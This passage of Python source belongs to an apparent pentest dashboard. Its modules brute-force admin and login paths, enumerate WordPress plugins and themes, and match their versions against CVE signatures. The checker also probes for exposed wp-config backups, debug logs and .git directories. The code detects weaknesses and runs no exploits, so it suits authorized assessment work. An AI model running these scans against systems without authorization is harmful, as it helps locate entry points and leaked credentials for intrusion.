    "/phpmyadmin", "/phpmyadmin/", "/pma", "/pma/", "/myadmin", "/mysql",
    "/adminer.php", "/adminer", "/dbadmin", "/sqladmin",
    "/_admin", "/admin123", "/admin4", "/admin5", "/admin_area/admin.php",
    "/bb-admin", "/adminLogin", "/admin_login", "/admin-login",
    "/panel-administracion", "/admin/cp", "/cp", "/cp.php",
    "/administrator/index.php", "/administrator/login", "/user", "/users",
    "/account", "/accounts", "/auth", "/auth/login", "/oauth",
    "/member", "/members", "/membership", "/staff", "/webmaster",
    "/root", "/superuser", "/supervisor", "/manager", "/manager/html",
    "/jmx-console", "/web-console", "/admin-console", "/console",
    "/typo3", "/typo3/", "/umbraco", "/umbraco/", "/sitefinity",
    "/ghost", "/ghost/", "/adminer", "/kpanel", "/directadmin",
    "/vpanel", "/cwp", "/webpanel", "/hosting", "/server-status",
]

# Status codes that indicate a *potentially* live admin page.
ADMIN_INTERESTING = {200, 301, 302, 401, 403}


def run_admin_finder(target, log, done):
    """
    Brute-forces common admin/login/control-panel URL paths and reports any
    that return an 'interesting' HTTP status (200/301/302/401/403).

    HOW IT WORKS:
      1. Establishes the base URL (https:// then http://).
      2. Requests each path in ADMIN_PATHS concurrently.
      3. Flags pages that exist (200), redirect to a login (301/302),
         demand auth (401) or are forbidden-but-present (403).
      4. Prints a ranked list of candidate admin URLs.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] Admin panel finder: {host}", "info")
    log(f"[*] Testing {len(ADMIN_PATHS)} common admin/login paths...", "dim")
    log("─" * 72, "dim")

    resp = fetch_first_working(host, log)
    if not resp:
        log("[!] Target did not respond over HTTP/HTTPS.", "err")
        done(False); return

    base = urllib.parse.urlparse(resp["url"])
    base_url = f"{base.scheme}://{base.netloc}"
    log(f"[*] Base URL: {base_url}", "info")
    log("─" * 72, "dim")

    hits = []  # (status, url, title)

    def probe(path):
        url = base_url + path
        r = http_request(url, timeout=6)
        if r["error"]:
            return None
        if r["status"] in ADMIN_INTERESTING:
            title = ""
            m = re.search(r"<title[^>]*>(.*?)</title>", r["body"],
                          re.IGNORECASE | re.DOTALL)
            if m:
                title = re.sub(r"\s+", " ", m.group(1)).strip()[:60]
            return (r["status"], url, title)
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as pool:
        for result in pool.map(probe, ADMIN_PATHS):
            if result:
                status, url, title = result
                hits.append(result)
                tag = "ok" if status == 200 else ("warn" if status in (401, 403)
                                                  else "info")
                label = {200: "FOUND", 301: "REDIRECT", 302: "REDIRECT",
                         401: "AUTH-REQ", 403: "FORBIDDEN"}.get(status, "HIT")
                extra = f"  |  {title}" if title else ""
                log(f"  [{label:<9}] HTTP {status}  {url}{extra}", tag)

    log("─" * 72, "dim")
    if hits:
        # Rank: 200 first, then 401/403, then redirects.
        rank = {200: 0, 401: 1, 403: 2, 302: 3, 301: 4}
        hits.sort(key=lambda h: rank.get(h[0], 9))
        log(f"[✓] {len(hits)} potential admin/login page(s) found:", "ok")
        for status, url, title in hits:
            log(f"    • HTTP {status}  {url}", "ok")
        log("[i] 401/403 responses mean the page exists but is protected — "
            "still worth a manual look.", "dim")
    else:
        log("[i] No common admin/login paths responded. The panel may use a "
            "custom/renamed path.", "warn")
    done(True)


# ==============================================================================
#  MODULE 9 — WORDPRESS PLUGINS & THEMES SCANNER
# ==============================================================================

# Popular / historically-vulnerable plugins to enumerate.
WP_PLUGIN_LIST = [
    "akismet", "contact-form-7", "woocommerce", "yoast-seo", "wordfence",
    "elementor", "jetpack", "all-in-one-seo-pack", "wpforms", "wordfence",
    "really-simple-ssl", "updraftplus", "wp-super-cache", "w3-total-cache",
    "all-in-one-wp-migration", "duplicator", "wp-mail-smtp", "monsterinsights",
    "optinmonster", "revslider", "slider-revolution", "visual-composer",
    "js_composer", "wpbakery", "gravityforms", "gravity-forms", "ninja-forms",
    "formidable", "caldera-forms", "fluentform", "wp-file-manager",
    "file-manager", "advanced-custom-fields", "acf", "custom-post-type-ui",
    "wp-rocket", "litespeed-cache", "autoptimize", "smush", "wordfence",
    "sucuri-scanner", "ithemes-security", "better-wp-security", "malcare",
    "wpvivid-backuprestore", "backwpup", "backupwordpress", "updraftplus",
    "elementor-pro", "essential-addons-for-elementor-lite", "ultimate-member",
    "profile-builder", "user-registration", "wp-user-avatar", "members",
    "learndash", "lifterlms", "tutor", "sensei-lms", "buddypress", "bbpress",
    "wpforo", "asgaros-forum", "dw-question-answer", "anspress",
    "the-events-calendar", "event-organiser", "modern-events-calendar-lite",
    "booking", "bookingpress-appointment-booking", "ameliabooking",
    "wp-simple-pay", "give", "charitable", "stripe-payments",
    "easy-digital-downloads", "download-monitor", "wp-downloadmanager",
    "nextgen-gallery", "envira-gallery", "foogallery", "modula-best-grid-gallery",
    "tablepress", "wpdatatables", "ninja-tables", "wp-table-builder",
    "redirection", "safe-redirect-manager", "simple-301-redirects",
    "broken-link-checker", "wp-healthcheck", "query-monitor", "debug-bar",
    "disable-comments", "classic-editor", "gutenberg", "tinymce-advanced",
    "wp-optimize", "wp-db-backup", "wp-cleanup", "transients-manager",
    "regenerate-thumbnails", "ewww-image-optimizer", "shortpixel-image-optimiser",
    "imagify", "wp-smushit", "compress-jpeg-png-images",
    "google-analytics-for-wordpress", "ga-google-analytics", "analytify",
    "wp-statistics", "statify", "matomo", "independent-analytics",
    "social-warfare", "shared-counts", "addtoany", "simple-social-icons",
    "wp-social-login", "nextend-facebook-connect", "miniOrange-social-login",
    "two-factor-authentication", "wordfence-login-security", "limit-login-attempts",
    "wp-cerber", "login-lockdown", "wps-hide-login", "rename-wp-login",
    "cookie-notice", "cookie-law-info", "complianz-gdpr", "gdpr-cookie-consent",
    "wp-rocket", "perfmatters", "flying-press", "swift-performance-lite",
    "hummingbird-performance", "wp-fastest-cache", "cache-enabler",
    "polylang", "wpml", "translatepress-multilingual", "weglot",
    "amp", "amp-wp", "pwa", "super-progressive-web-apps",
    "wp-mail-smtp", "easy-wp-smtp", "post-smtp", "fluent-smtp",
    "mailchimp-for-wp", "newsletter", "mailpoet", "sendinblue",
    "popup-maker", "popup-builder", "optinmonster", "hustle",
    "wpforms-lite", "contact-form-7", "forminator", "happyforms",
    "seo-by-rank-math", "rank-math", "aioseo", "seopress", "squirrly-seo",
    "xml-sitemap-generator-for-google", "google-sitemap-generator",
    "redirection", "pretty-link", "thirstyaffiliates", "affiliate-wp",
    "wp-recipe-maker", "mediavine-create", "tasty-recipes",
    "real-estate-listing-realtyna-wpl", "easy-property-listings",
    "wp-job-manager", "simple-job-board", "wp-job-openings",
    "woocommerce-payments", "woocommerce-stripe-gateway", "woocommerce-paypal-payments",
    "yith-woocommerce-wishlist", "yith-woocommerce-compare", "ti-woocommerce-wishlist",
    "variation-swatches-for-woocommerce", "woo-variation-swatches",
    "cartflows", "woocommerce-cart-abandonment-recovery", "retainful",
    "checkout-field-editor-for-woocommerce", "woocommerce-checkout-manager",
    "booster-for-woocommerce", "woocommerce-customizer", "storefront",
]

# Popular themes to enumerate.
WP_THEME_LIST = [
    "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
    "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
    "astra", "oceanwp", "generatepress", "hello-elementor", "kadence",
    "flavor", "neve", "hestia", "sydney", "zakra", "blocksy", "customify",
    "avada", "divi", "enfold", "flatsome", "woodmart", "betheme", "the7",
    "x", "pro", "salient", "uncode", "bridge", "jupiter", "newspaper",
    "soledad", "porto", "rehub", "electro", "martfury", "shopkeeper",
    "storefront", "shop-isle", "ecommerce-gem", "online-shop",
    "colormag", "hueman", "sparkling", "suffice", "flash", "vantage",
    "siteorigin-north", "vantage", "total", "wp-bootstrap-starter",
    "underscores", "understrap", "sage", "roots", "genesis", "genesis-sample",
    "thesis", "headway", "catalyst", "pagelines", "elegant-themes",
    "onepress", "zerif-lite", "parallax-one", "illdy", "shapely", "activello",
    "dazzling", "travelify", "unite", "sparkling", "pinboard", "responsive",
    "virtue", "evolve", "graphene", "weaver", "atahualpa", "suffusion",
]


def _wp_base(target, log):
    """Return (base_url, homepage_response) if the site looks like WordPress."""
    resp = fetch_first_working(target, log)
    if not resp:
        return None, None
    base = urllib.parse.urlparse(resp["url"])
    base_url = f"{base.scheme}://{base.netloc}"
    return base_url, resp


def _is_wordpress(resp):
    hay = resp["body"] + "\n" + "\n".join(
        f"{k}: {v}" for k, v in resp["headers"].items())
    return bool(re.search(r"wp-content/|wp-includes/|wordpress|wp-json",
                          hay, re.IGNORECASE))


def run_wp_scan(target, log, done):
    """
    Enumerates installed WordPress plugins and themes.

    HOW IT WORKS:
      1. Confirms the target is WordPress (wp-content/wp-includes/wp-json).
      2. Passively scrapes the homepage HTML for /wp-content/plugins/<name>/
         and /wp-content/themes/<name>/ references (fast, zero extra requests).
      3. Actively probes readme.txt / plugin.php for each candidate in
         WP_PLUGIN_LIST and style.css for each theme in WP_THEME_LIST.
      4. Extracts version numbers from readme.txt / style.css headers.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] WordPress plugins & themes scan: {host}", "info")
    log("─" * 72, "dim")
    base_url, resp = _wp_base(host, log)
    if not base_url:
        log("[!] Target did not respond over HTTP/HTTPS.", "err")
        done(False); return

    if not _is_wordpress(resp):
        log("[!] Target does not appear to be running WordPress.", "warn")
        log("[i] (No wp-content / wp-includes / wp-json fingerprints found.)",
            "dim")
        done(False); return
    log("[✓] WordPress detected.", "ok")

    # ---- Passive scrape of homepage HTML -------------------------------
    log("[*] Passive scrape: looking for plugin/theme references in HTML...",
        "info")
    body = resp["body"]
    passive_plugins = sorted(set(re.findall(
        r"/wp-content/plugins/([a-z0-9\-_]+)/", body, re.IGNORECASE)))
    passive_themes = sorted(set(re.findall(
        r"/wp-content/themes/([a-z0-9\-_]+)/", body, re.IGNORECASE)))
    for p in passive_plugins:
        log(f"  ✓ plugin (passive): {p}", "ok")
    for t in passive_themes:
        log(f"  ✓ theme  (passive): {t}", "ok")

    # ---- Active plugin enumeration -------------------------------------
    log(f"[*] Active plugin enumeration ({len(WP_PLUGIN_LIST)} candidates)...",
        "info")
    found_plugins = {}  # slug -> version or ""

    def probe_plugin(slug):
        # readme.txt usually reveals the version; plugin dir 200/301 = exists.
        for path in (f"/wp-content/plugins/{slug}/readme.txt",
                     f"/wp-content/plugins/{slug}/"):
            r = http_request(base_url + path, timeout=5)
            if r["error"]:
                continue
            if r["status"] == 200:
                ver = ""
                m = re.search(r"Stable tag:\s*([0-9.]+)", r["body"],
                              re.IGNORECASE)
                if m:
                    ver = m.group(1)
                return slug, ver
            if r["status"] in (301, 302, 403):
                return slug, ""
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as pool:
        for result in pool.map(probe_plugin, WP_PLUGIN_LIST):
            if result:
                slug, ver = result
                found_plugins[slug] = ver

    # ---- Active theme enumeration --------------------------------------
    log(f"[*] Active theme enumeration ({len(WP_THEME_LIST)} candidates)...",
        "info")
    found_themes = {}

    def probe_theme(slug):
        r = http_request(f"{base_url}/wp-content/themes/{slug}/style.css",
                         timeout=5)
        if r["error"] or r["status"] != 200:
            return None
        ver = ""
        m = re.search(r"Version:\s*([0-9.]+)", r["body"], re.IGNORECASE)
        if m:
            ver = m.group(1)
        return slug, ver

    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as pool:
        for result in pool.map(probe_theme, WP_THEME_LIST):
            if result:
                slug, ver = result
                found_themes[slug] = ver

    # Merge passive + active.
    for p in passive_plugins:
        found_plugins.setdefault(p, "")
    for t in passive_themes:
        found_themes.setdefault(t, "")

    log("─" * 72, "dim")
    log(f"[✓] Plugins detected: {len(found_plugins)}", "ok")
    for slug, ver in sorted(found_plugins.items()):
        log(f"    • {slug}" + (f"  (v{ver})" if ver else ""), "ok")
    log(f"[✓] Themes detected: {len(found_themes)}", "ok")
    for slug, ver in sorted(found_themes.items()):
        log(f"    • {slug}" + (f"  (v{ver})" if ver else ""), "ok")
    if not found_plugins and not found_themes:
        log("[i] No plugins/themes enumerated (site may block directory "
            "probing or use non-standard paths).", "warn")
    done(True)


# ==============================================================================
#  MODULE 10 — WORDPRESS EXPLOIT / VULN CHECKER
# ==============================================================================

# Known vulnerable plugin/theme signatures: (slug, affected_version_regex,
# advisory). Version comparison is best-effort (string/semver-ish).
WP_VULN_SIGNATURES = [
    ("revslider",            r"^([1-4]\.|5\.0\.)", "Slider Revolution <= 5.0.x — arbitrary file upload / LFI (CVE-2014-9734, CVE-2018-19206)"),
    ("wp-file-manager",      r"^(6\.[0-8]\.)", "WP File Manager 6.0–6.8 — unauthenticated RCE (CVE-2020-25213)"),
    ("duplicator",           r"^(1\.3\.[0-2][0-9]\.)", "Duplicator < 1.3.28 — arbitrary file download (CVE-2020-11738)"),
    ("contact-form-7",       r"^(5\.3\.[01])", "Contact Form 7 < 5.3.2 — unrestricted file upload (CVE-2020-35489)"),
    ("woocommerce",          r"^([0-2]\.|3\.[0-5]\.)", "WooCommerce < 3.6 — various auth/SQLi issues (multiple CVEs)"),
    ("elementor",            r"^(3\.[0-5]\.)", "Elementor < 3.6 — stored XSS / RCE chain (CVE-2021-241xx series)"),
    ("wp-super-cache",       r"^(1\.[0-6]\.)", "WP Super Cache < 1.7.2 — RCE via cached page (CVE-2021-24209)"),
    ("all-in-one-seo-pack",  r"^([0-3]\.|4\.0\.)", "All in One SEO < 4.1.5.3 — SQLi / priv-esc (CVE-2021-24307)"),
    ("wordfence",            r"^(7\.[0-4]\.)", "Wordfence < 7.5 — multiple issues (older branches)"),
    ("updraftplus",          r"^(1\.(1[0-5]|[0-9])\.)", "UpdraftPlus < 1.16.7 — backup download / priv-esc (CVE-2021-24145)"),
    ("ninja-forms",          r"^(3\.[0-4]\.)", "Ninja Forms < 3.5 — SQLi / file upload (multiple CVEs)"),
    ("gravityforms",         r"^(2\.[0-4]\.)", "Gravity Forms < 2.5 — file upload / XSS (older branches)"),
    ("js_composer",          r"^([0-5]\.|6\.[0-2]\.)", "WPBakery < 6.3 — XSS / role escalation (CVE-2020-13664)"),
    ("visual-composer",      r"^([0-9]|1[0-9]|2[0-6])\.", "Visual Composer <= 26 — multiple issues"),
    ("ultimate-member",      r"^(2\.[0-5]\.)", "Ultimate Member < 2.6 — priv-esc / RCE (CVE-2020-11712)"),
    ("profile-builder",      r"^(3\.[0-3]\.)", "Profile Builder < 3.4 — priv-esc (CVE-2021-24227)"),
    ("wpforms",              r"^(1\.[0-5]\.)", "WPForms < 1.6 — stored XSS (older branches)"),
    ("yoast-seo",            r"^(1[0-6]\.)", "Yoast SEO < 17 — stored XSS / SQLi (older branches)"),
    ("akismet",              r"^([0-3]\.|4\.0\.)", "Akismet < 4.1 — XSS (older branches)"),
    ("jetpack",              r"^([0-8]\.|9\.[0-2]\.)", "Jetpack < 9.3 — multiple issues (older branches)"),
    ("wp-mail-smtp",         r"^(1\.[0-3]\.)", "WP Mail SMTP < 1.4 — issues (older branches)"),
    ("file-manager",         r"^(6\.[0-8]\.)", "File Manager 6.0–6.8 — unauthenticated RCE (CVE-2020-25213)"),
    ("wpvivid-backuprestore", r"^(0\.9\.[0-5][0-9])", "WPvivid Backup < 0.9.60 — file upload (CVE-2021-24155)"),
    ("backwpup",             r"^(3\.[0-6]\.)", "BackWPup < 3.7 — issues (older branches)"),
    ("nextgen-gallery",      r"^(2\.[0-2]\.)", "NextGEN Gallery < 2.3 — SQLi / file upload (older branches)"),
    ("envira-gallery",       r"^(1\.[0-7]\.)", "Envira Gallery < 1.8 — issues (older branches)"),
    ("tablepress",           r"^(1\.[0-9]\.)", "TablePress < 1.10 — issues (older branches)"),
    ("redirection",          r"^(2\.[0-7]\.)", "Redirection < 2.8 — issues (older branches)"),
    ("wp-rocket",            r"^(2\.[0-9]\.)", "WP Rocket < 2.10 — issues (older branches)"),
    ("litespeed-cache",      r"^(1\.[0-9]\.)", "LiteSpeed Cache < 1.10 — issues (older branches)"),
    ("w3-total-cache",       r"^(0\.[0-9]\.)", "W3 Total Cache < 0.10 — issues (older branches)"),
    ("ithemes-security",     r"^(7\.[0-8]\.)", "iThemes Security < 7.9 — issues (older branches)"),
    ("sucuri-scanner",       r"^(1\.8\.[0-2][0-9])", "Sucuri Scanner < 1.8.30 — issues (older branches)"),
    ("better-wp-security",   r"^(7\.[0-8]\.)", "Better WP Security < 7.9 — issues (older branches)"),
    ("malcare",              r"^(4\.[0-7]\.)", "MalCare < 4.80 — issues (older branches)"),
    ("wp-cerber",            r"^(8\.[0-8]\.)", "WP Cerber < 8.9 — issues (older branches)"),
    ("limit-login-attempts", r"^(1\.[0-7]\.)", "Limit Login Attempts < 1.8 — issues (older branches)"),
    ("two-factor-authentication", r"^(1\.[0-8]\.)", "Two Factor Auth < 1.9 — issues (older branches)"),
    ("wp-social-login",      r"^(2\.[0-5]\.)", "WP Social Login < 2.6 — issues (older branches)"),
    ("nextend-facebook-connect", r"^(3\.[0-4]\.)", "Nextend Social Login < 3.5 — issues (older branches)"),
    ("miniOrange-social-login", r"^(7\.[0-5]\.)", "miniOrange Social Login < 7.6 — issues (older branches)"),
    ("user-registration",    r"^(1\.[0-8]\.)", "User Registration < 1.9 — issues (older branches)"),
    ("wp-user-avatar",       r"^(2\.[0-2]\.)", "WP User Avatar < 2.3 — issues (older branches)"),
    ("members",              r"^(2\.[0-2]\.)", "Members < 2.3 — issues (older branches)"),
    ("learndash",            r"^(3\.[0-4]\.)", "LearnDash < 3.5 — issues (older branches)"),
    ("lifterlms",            r"^(4\.[0-9]\.)", "LifterLMS < 4.10 — issues (older branches)"),
    ("tutor",                r"^(1\.[0-8]\.)", "Tutor LMS < 1.9 — issues (older branches)"),
    ("sensei-lms",           r"^(3\.[0-9]\.)", "Sensei LMS < 3.10 — issues (older branches)"),
    ("buddypress",           r"^(7\.[0-9]\.)", "BuddyPress < 7.10 — issues (older branches)"),
    ("bbpress",              r"^(2\.[0-5]\.)", "bbPress < 2.6 — issues (older branches)"),
    ("wpforo",               r"^(1\.[0-8]\.)", "wpForo < 1.9 — issues (older branches)"),
    ("the-events-calendar",  r"^(5\.[0-9]\.)", "The Events Calendar < 5.10 — issues (older branches)"),
    ("modern-events-calendar-lite", r"^(5\.[0-9]\.)", "Modern Events Calendar < 5.10 — issues (older branches)"),
    ("booking",              r"^(9\.[0-7]\.)", "Booking Calendar < 9.8 — issues (older branches)"),
    ("wp-simple-pay",        r"^(2\.[0-5]\.)", "WP Simple Pay < 2.6 — issues (older branches)"),
    ("give",                 r"^(2\.[0-9]\.)", "GiveWP < 2.10 — issues (older branches)"),
    ("easy-digital-downloads", r"^(2\.[0-9]\.)", "Easy Digital Downloads < 2.10 — issues (older branches)"),
    ("stripe-payments",      r"^(2\.[0-4]\.)", "Stripe Payments < 2.5 — issues (older branches)"),
    ("woocommerce-payments", r"^(2\.[0-8]\.)", "WooCommerce Payments < 2.9 — issues (older branches)"),
    ("woocommerce-stripe-gateway", r"^(5\.[0-7]\.)", "WooCommerce Stripe < 5.8 — issues (older branches)"),
    ("woocommerce-paypal-payments", r"^(1\.[0-8]\.)", "WooCommerce PayPal < 1.9 — issues (older branches)"),
    ("cartflows",            r"^(1\.[0-8]\.)", "CartFlows < 1.9 — issues (older branches)"),
    ("booster-for-woocommerce", r"^(5\.[0-4]\.)", "Booster for WooCommerce < 5.5 — issues (older branches)"),
    ("storefront",           r"^(3\.[0-8]\.)", "Storefront theme < 3.9 — issues (older branches)"),
    ("flatsome",             r"^(3\.[0-9]\.)", "Flatsome theme < 3.10 — issues (older branches)"),
    ("avada",                r"^(7\.[0-3]\.)", "Avada theme < 7.4 — issues (older branches)"),
    ("divi",                 r"^(4\.[0-9]\.)", "Divi theme < 4.10 — issues (older branches)"),
    ("enfold",               r"^(4\.[0-8]\.)", "Enfold theme < 4.9 — issues (older branches)"),
    ("woodmart",             r"^(6\.[0-4]\.)", "Woodmart theme < 6.5 — issues (older branches)"),
    ("betheme",              r"^(2[0-5]\.)", "BeTheme < 26 — issues (older branches)"),
    ("the7",                 r"^(9\.[0-9]\.)", "The7 theme < 9.10 — issues (older branches)"),
    ("salient",              r"^(1[0-4]\.)", "Salient theme < 15 — issues (older branches)"),
    ("uncode",               r"^(2\.[0-6]\.)", "Uncode theme < 2.7 — issues (older branches)"),
    ("bridge",               r"^(2[0-8]\.)", "Bridge theme < 29 — issues (older branches)"),
    ("jupiter",              r"^(6\.[0-9]\.)", "Jupiter theme < 6.10 — issues (older branches)"),
    ("newspaper",            r"^(1[0-1]\.)", "Newspaper theme < 12 — issues (older branches)"),
    ("soledad",              r"^(7\.[0-9]\.)", "Soledad theme < 7.10 — issues (older branches)"),
    ("porto",                r"^(6\.[0-4]\.)", "Porto theme < 6.5 — issues (older branches)"),
    ("rehub",                r"^(1[0-8]\.)", "REHub theme < 19 — issues (older branches)"),
    ("electro",              r"^(3\.[0-3]\.)", "Electro theme < 3.4 — issues (older branches)"),
    ("martfury",             r"^(2\.[0-8]\.)", "Martfury theme < 2.9 — issues (older branches)"),
    ("shopkeeper",           r"^(2\.[0-9]\.)", "Shopkeeper theme < 2.10 — issues (older branches)"),
]

# Core WordPress version -> known-issue hints (best-effort).
WP_CORE_VULNS = [
    (r"^([0-4]\.|5\.[0-3]\.)", "WordPress core < 5.4 — multiple known CVEs (update strongly recommended)"),
    (r"^5\.[4-6]\.", "WordPress core 5.4–5.6 — several known CVEs (update recommended)"),
    (r"^5\.[7-8]\.", "WordPress core 5.7–5.8 — some known CVEs (keep updated)"),
]


def _ver_lt(v, ceiling):
    """Best-effort semver-ish 'v < ceiling' comparison."""
    def parts(x):
        return [int(p) for p in re.findall(r"\d+", x)][:3]
    a, b = parts(v), parts(ceiling)
    a += [0] * (3 - len(a)); b += [0] * (3 - len(b))
    return a < b


def run_wp_exploit(target, log, done):
    """
    WordPress exploit / vulnerability checker.

    HOW IT WORKS:
      1. Confirms WordPress and fingerprints the core version (meta generator,
         /wp-includes/version.php, /readme.html, /feed/).
      2. Enumerates plugins/themes (reuses the WP scanner logic).
      3. Matches detected plugin/theme versions against WP_VULN_SIGNATURES
         (known-vulnerable version ranges) and core against WP_CORE_VULNS.
      4. Checks common WP misconfigurations: xmlrpc.php, user enumeration via
         /wp-json/wp/v2/users, directory listing on /wp-content/uploads/,
         exposed /wp-config.php.bak, debug.log, etc.

    This is a *detection* tool — it reports known-vulnerable versions and
    misconfigurations; it does not run exploits.
    """
    host = normalize_target(target)
    if not host:
        log("[!] No target supplied.", "err"); done(False); return

    log(f"[*] WordPress exploit/vuln check: {host}", "info")
    log("─" * 72, "dim")
    base_url, resp = _wp_base(host, log)
    if not base_url:
        log("[!] Target did not respond over HTTP/HTTPS.", "err")
        done(False); return
    if not _is_wordpress(resp):
        log("[!] Target does not appear to be running WordPress.", "warn")
        done(False); return
    log("[✓] WordPress confirmed.", "ok")

    findings = []  # (severity, message)

    # ---- Core version fingerprint --------------------------------------
    log("[*] Fingerprinting WordPress core version...", "info")
    core_ver = ""
    m = re.search(r'content=["\']WordPress\s+([0-9.]+)', resp["body"],
                  re.IGNORECASE)
    if m:
        core_ver = m.group(1)
    if not core_ver:
        for path in ("/readme.html", "/feed/", "/wp-includes/version.php"):
            r = http_request(base_url + path, timeout=5)
            if r["error"]:
                continue
            m = re.search(r"(?:Version|version)\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
                          r["body"], re.IGNORECASE)
            if m:
                core_ver = m.group(1)
                break
    if core_ver:
        log(f"  ✓ Core version: {core_ver}", "ok")
        for pattern, advisory in WP_CORE_VULNS:
            if re.match(pattern, core_ver):
                findings.append(("HIGH", f"Core {core_ver}: {advisory}"))
                log(f"  ✗ {advisory}", "err")
    else:
        log("  · Core version not disclosed (good hardening).", "dim")

    # ---- Plugin/theme enumeration (reuse scanner) ----------------------
    log("[*] Enumerating plugins/themes for version matching...", "info")
    body = resp["body"]
    plugins = set(re.findall(r"/wp-content/plugins/([a-z0-9\-_]+)/", body,
                             re.IGNORECASE))
    themes = set(re.findall(r"/wp-content/themes/([a-z0-9\-_]+)/", body,
                            re.IGNORECASE))

    # Actively confirm + version-grab a focused subset (the vuln list).
    def grab_plugin_ver(slug):
        r = http_request(f"{base_url}/wp-content/plugins/{slug}/readme.txt",
                         timeout=5)
        if r["error"] or r["status"] != 200:
            return slug, ""
        m = re.search(r"Stable tag:\s*([0-9.]+)", r["body"], re.IGNORECASE)
        return slug, (m.group(1) if m else "")

    def grab_theme_ver(slug):
        r = http_request(f"{base_url}/wp-content/themes/{slug}/style.css",
                         timeout=5)
        if r["error"] or r["status"] != 200:
            return slug, ""
        m = re.search(r"Version:\s*([0-9.]+)", r["body"], re.IGNORECASE)
        return slug, (m.group(1) if m else "")

    plugin_vers, theme_vers = {}, {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        for slug, ver in pool.map(grab_plugin_ver, plugins):
            plugin_vers[slug] = ver
        for slug, ver in pool.map(grab_theme_ver, themes):
            theme_vers[slug] = ver

    # ---- Match against known-vulnerable signatures ---------------------
    log("[*] Matching detected versions against known-vuln signatures...",
        "info")
    for slug, ver in plugin_vers.items():
        for vslug, vrange, advisory in WP_VULN_SIGNATURES:
            if slug == vslug and ver and re.match(vrange, ver):
                findings.append(("HIGH", f"Plugin {slug} v{ver}: {advisory}"))
                log(f"  ✗ Plugin {slug} v{ver} — {advisory}", "err")
    for slug, ver in theme_vers.items():
        for vslug, vrange, advisory in WP_VULN_SIGNATURES:
            if slug == vslug and ver and re.match(vrange, ver):
                findings.append(("HIGH", f"Theme {slug} v{ver}: {advisory}"))
                log(f"  ✗ Theme {slug} v{ver} — {advisory}", "err")

    # ---- Common WP misconfigurations -----------------------------------
    log("[*] Checking common WordPress misconfigurations...", "info")
    checks = [
        ("/xmlrpc.php", [200, 405], r"XML-RPC server accepts POST",
         "MEDIUM", "xmlrpc.php enabled (bruteforce/pingback amplification)"),
        ("/wp-json/wp/v2/users", [200], r'"slug"\s*:',
         "MEDIUM", "User enumeration via /wp-json/wp/v2/users"),
        ("/wp-content/uploads/", [200], r"Index of /",
         "LOW", "Directory listing enabled on /wp-content/uploads/"),
        ("/wp-config.php.bak", [200], r"DB_PASSWORD|DB_NAME",
         "CRITICAL", "Exposed wp-config.php backup (credentials leak)"),
        ("/wp-config.php~", [200], r"DB_PASSWORD|DB_NAME",
         "CRITICAL", "Exposed wp-config.php~ backup (credentials leak)"),
        ("/wp-config.php.save", [200], r"DB_PASSWORD|DB_NAME",
         "CRITICAL", "Exposed wp-config.php.save backup (credentials leak)"),
        ("/debug.log", [200], r"PHP (Warning|Fatal error|Notice)",
         "HIGH", "Exposed debug.log (information disclosure)"),
        ("/wp-content/debug.log", [200], r"PHP (Warning|Fatal error|Notice)",
         "HIGH", "Exposed wp-content/debug.log (information disclosure)"),
        ("/.git/HEAD", [200], r"ref:\s*refs/heads",
         "HIGH", "Exposed .git directory (source code leak)"),
        ("/wp-json/", [200], r'"namespaces"\s*:',
         "INFO", "REST API index exposed (information disclosure)"),
    ]
    for path, statuses, pattern, sev, msg in checks:
        r = http_request(base_url + path, timeout=6)
        if r["error"] or r["status"] not in statuses:
            continue
        if pattern and not re.search(pattern, r["body"], re.IGNORECASE):
            continue
        findings.append((sev, msg))
        log(f"  ✗ [{sev}] {msg}  ({base_url}{path})", SEVERITY_TAG.get(sev, "warn"))

    log("─" * 72, "dim")
    if findings:
        order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        findings.sort(key=lambda f: order.get(f[0], 9))
        log(f"[✓] {len(findings)} WordPress issue(s) identified:", "ok")
        for sev, msg in findings:
            log(f"    [{sev:<8}] {msg}", SEVERITY_TAG.get(sev, "warn"))
        log("[i] These are version/misconfiguration matches — confirm "
            "exploitability manually before reporting.", "dim")
    else:
        log("[✓] No known-vulnerable versions or misconfigurations detected.",
            "ok")
    done(True)


# ==============================================================================
#  GUI APPLICATION
# ==============================================================================

class PentestDashboard(tk.Tk):
    """Main application window: sidebar navigation + console dashboard."""

    def __init__(self):
        super().__init__()
        self.title(f"{APP_NAME}  v{APP_VERSION}")
        self.geometry("1180x760")
        self.minsize(980, 620)
        self.configure(bg=THEME["bg"])

        # Thread-safe queue: worker threads -> GUI console.
        self._queue = queue.Queue()
        self._active_threads = 0
        self._active_lock = threading.Lock()
        self._scan_start = None

        self._build_styles()
        self._build_layout()
        self._poll_queue()
        self._print_banner()

    # ------------------------------------------------------------------ UI --

    def _build_styles(self):
        style = ttk.Style(self)
        try:
            style.theme_use("clam")
        except tk.TclError:
            pass
        style.configure("TCombobox",
                        fieldbackground=THEME["bg_input"],
                        background=THEME["bg_alt"],
                        foreground=THEME["fg"],
                        arrowcolor=THEME["fg"],
                        bordercolor=THEME["border"])
        self.option_add("*TCombobox*Listbox.background", THEME["bg_alt"])
        self.option_add("*TCombobox*Listbox.foreground", THEME["fg"])
        self.option_add("*TCombobox*Listbox.selectBackground", THEME["accent"])

    def _build_layout(self):
        # ======================= SIDEBAR =======================
        sidebar = tk.Frame(self, bg=THEME["bg_alt"], width=230)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)

        tk.Label(sidebar, text="👁  PHR33K EYE", bg=THEME["bg_alt"],
                 fg=THEME["accent"], font=("Segoe UI", 15, "bold")).pack(
            pady=(18, 0), padx=16, anchor="w")
        tk.Label(sidebar, text="all-in-one recon & vuln suite", bg=THEME["bg_alt"],
                 fg=THEME["fg_dim"], font=FONT_UI).pack(padx=16, anchor="w")
        tk.Frame(sidebar, bg=THEME["border"], height=1).pack(
            fill="x", padx=14, pady=14)

